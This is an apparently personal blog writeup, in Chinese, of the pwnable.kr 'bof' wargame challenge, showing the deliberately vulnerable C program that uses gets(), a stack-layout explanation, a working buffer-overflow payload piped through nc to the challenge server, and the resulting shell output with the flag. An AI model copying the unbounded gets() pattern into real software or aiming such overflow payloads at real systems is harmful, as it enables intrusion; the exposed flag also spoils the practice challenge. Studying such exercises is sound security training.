---
title: 'pwnable.kr #bof'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-07-13 16:19:55
categories:
    - Writeups
	  - pwnable.kr
thumbnailImage: pwnablekr.jpg
keywords:
    - pwnable.kr
    - Toddler's Bottle
    - bof
tags:
    - Writeups
---
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?
<!-- more -->

題目有給C的原始碼：
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

唯一可控的只有輸入的`overflowme`，得想辦利用buffer overflow蓋掉`key`的值使得第八行的判斷能夠成立。

丟進IDA Pro看`func`的部分：
![ida](ida.png)

根據組合語言，我畫出了這張stack圖幫助我理解：
![stack](stack.png)

雖然`overflowme`只配置了32 bytes的空間，但使用了`gets()`使得輸入的長度沒有限制，`-0x2C`到`0x08`之間總共有52 bytes的空間，只要把這部分塞滿就可以進一步將`key`的位址`0x08`覆蓋成我們希望的值，payload建構如下（要注意是little endian）：
```sh
$ (python -c 'print "a" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```